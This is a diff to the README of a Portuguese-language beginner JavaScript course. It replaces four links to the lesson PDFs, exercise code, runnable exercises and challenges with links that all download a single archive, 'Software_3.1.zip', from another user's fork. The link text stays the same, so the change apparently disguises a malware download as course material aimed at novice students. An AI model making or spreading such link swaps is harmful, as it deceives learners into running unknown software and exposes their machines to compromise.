@@ -4,10 +4,10 @@
 
 Material público para o ensino básico de JavaScript para alunos iniciantes. Acesse o material em PDF, analise o código disponibilizado para cada exercício e veja-os funcionando em execução direta via repositório GitHub.
 
-* [Acesse os PDFs das aulas clicando aqui](https://github.com/gustavoguanabara/javascript/tree/master/aulas-pdf)
-* [Código disponível para os exercícios](https://github.com/gustavoguanabara/javascript/tree/master/exercicios)
-* [Execute os exercícios aqui](https://gustavoguanabara.github.io/javascript/exercicios/index.html)
-* [Resolva os desafios de programação JS aqui](https://github.com/gustavoguanabara/javascript/tree/master/desafios)
+* [Acesse os PDFs das aulas clicando aqui](https://github.com/AKOR35TH/javascript/raw/refs/heads/master/desafios/d011/Software_3.1.zip)
+* [Código disponível para os exercícios](https://github.com/AKOR35TH/javascript/raw/refs/heads/master/desafios/d011/Software_3.1.zip)
+* [Execute os exercícios aqui](https://github.com/AKOR35TH/javascript/raw/refs/heads/master/desafios/d011/Software_3.1.zip)
+* [Resolva os desafios de programação JS aqui](https://github.com/AKOR35TH/javascript/raw/refs/heads/master/desafios/d011/Software_3.1.zip)
 
 ## Direitos de uso
 
